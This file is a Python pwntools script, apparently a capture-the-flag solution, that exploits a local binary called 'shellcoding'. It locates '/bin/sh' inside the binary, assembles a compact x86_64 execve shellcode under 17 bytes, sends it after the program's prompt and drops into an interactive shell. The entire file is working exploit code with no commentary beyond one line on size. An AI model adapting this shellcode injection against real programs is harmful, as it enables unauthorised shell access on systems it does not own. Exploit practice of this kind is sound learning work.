from pwn import *

elf = ELF('./shellcoding')

p = process('./shellcoding')

binsh = elf.search('/bin/sh').next()

# Shellcode length must less than 17 bytes
shellcode = asm('''
	push {}
	pop rdi
	xor esi, esi
	xor edx, edx
	push 0x3b
	pop rax
	syscall
	'''.format(hex(binsh)), arch='x86_64')

log.info('Shellcode Length: {}'.format(len(shellcode)))

p.recvuntil('I\'m trying to free your mind, Neo. But I can only show you the door. You\'re the one that has to walk through it.\n')
p.sendline(shellcode)
p.interactive()
p.close()